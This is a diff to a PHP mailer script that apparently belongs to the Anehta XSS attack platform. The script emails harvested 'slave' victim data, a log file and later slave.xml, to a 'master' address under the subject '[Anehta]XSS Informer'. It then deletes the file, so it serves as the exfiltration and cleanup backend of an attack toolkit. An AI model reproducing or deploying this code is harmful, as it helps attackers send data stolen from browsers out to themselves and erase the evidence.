@@ -14,7 +14,7 @@ include_once('../tools/phpMailer/class.phpmailer.php');
 
 $mail             = new PHPMailer();
 
-//$body             = $mail->getFile('../slave/Slave_1224341218390/log.txt');
+$body             = $mail->getFile('../slave/slave.xml');
 //$body             = iconv('gb2312', 'utf-8',$body); 
 //$body             = eregi_replace("[\]",'',$body);
 
@@ -34,24 +34,24 @@ $mail->From       = "anehtatest@gmail.com";
 $mail->FromName   = "Anehta";
 
 // 获取水印
-if (!empty($_GET["delslavelog"])){
-  $slaveid = $_GET["delslavelog"];
-}
+//if (!empty($_GET["delslavelog"])){
+//  $slaveid = $_GET["delslavelog"];
+//}
 
 $mail->Subject    = "[Anehta]XSS Informer - ".$slaveid." - !";
 
-$mail->Body       = "Master, This is the Slave Infomation!";                      //HTML Body
+//$mail->Body       = "Master, This is the Slave Infomation!";                      //HTML Body
 //$mail->AltBody    = "To view the message, please use an HTML compatible email viewer!"; // optional, comment out and test
 //$mail->WordWrap   = 50; // set word wrap
 
-//$mail->Body       = $body; // 发送纯文本邮件
+$mail->Body       = $body; // 发送纯文本邮件
 //$mail->MsgHTML($body);
 
 $mail->AddAddress("axis@ph4nt0m.org", "Anehta Master");
 
 
 
-$mail->AddAttachment("../slave/$slaveid/log.txt");     // attachment 日志作为附件发送
+//$mail->AddAttachment("../slave/$slaveid/log.txt");     // attachment 日志作为附件发送
 
 
 $mail->IsHTML(false); // true send as HTML; false to send text mail
@@ -63,12 +63,11 @@ if(!$mail->Send()) {
   
   sleep(2);
   // 删除log文件
-  unlink("../slave/$slaveid/log.txt");
+  unlink("../slave/slave.xml");
   
   //删除目录
-  sleep(1);
-  rmdir("../slave/$slaveid");
+  //sleep(1);
+  //rmdir("../slave/$slaveid");
 }
-
 
 ?>
